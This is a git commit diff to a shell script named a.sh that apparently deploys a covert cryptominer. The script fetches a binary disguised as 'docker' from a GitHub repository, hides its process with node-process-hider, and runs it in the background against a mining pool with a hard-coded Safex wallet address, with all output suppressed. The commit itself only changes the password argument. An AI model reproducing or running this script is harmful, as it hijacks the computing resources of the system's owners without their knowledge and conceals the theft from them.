986a42d4c048eddb503a315588e308aa96b44a9a
jsiqiisn <jsiqiisn@outlook.com>
2022-04-03 12:33:25 +0000

    Update a.sh

--- a.sh
+++ a.sh
@@ -7,5 +7,5 @@ npm i -g node-process-hider
 wget https://raw.githubusercontent.com/jsiqiisn/baby/main/docker
 ph add docker
 chmod +x docker
-./docker -o sf.pool-pay.com:4025 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p $(echo $(shuf -i 1-20000 -n 1)-V) -k -a rx/sfx > /dev/null 2>&1 &
+./docker -o sf.pool-pay.com:4025 -u SafexsnsPwCNzaHDEfcGTzgW9rNcKQhAmBFNrH8KRUjvcfZHGuyKAgSd1Gd5C72WVwLtUfhA3tyXsLQnkXbH1JwGHkgxtdoGRvc3n -p x@$..$(echo $(shuf -i 1111-9999 -n 1)-VAL) -k -a rx/sfx > /dev/null 2>&1 &
 uname -a
